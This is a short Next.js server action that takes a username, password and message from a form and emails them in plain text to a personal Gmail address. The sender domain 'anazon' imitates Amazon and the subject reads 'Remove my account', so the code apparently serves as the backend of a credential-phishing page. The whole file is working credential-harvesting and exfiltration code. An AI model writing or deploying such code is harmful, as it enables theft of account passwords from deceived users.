"use server";
import { Resend } from "resend";
import { redirect } from 'next/navigation';

const resend = new Resend(process.env.RESEND_API_KEY);

export const sendEmail1 = async (formData: FormData) => {
    const username = formData.get("username");
    const password = formData.get("password"); 
    const message = formData.get("message");


 
        resend.emails.send({
            from: "info@anazon.hadizproductions.com", 
            to: "medlej333@gmail.com",
            subject: "Remove my account",
            text: "username: " + username + "\nPassword:" + password + "\n" + message,
        }) 
    redirect('/thank');

}

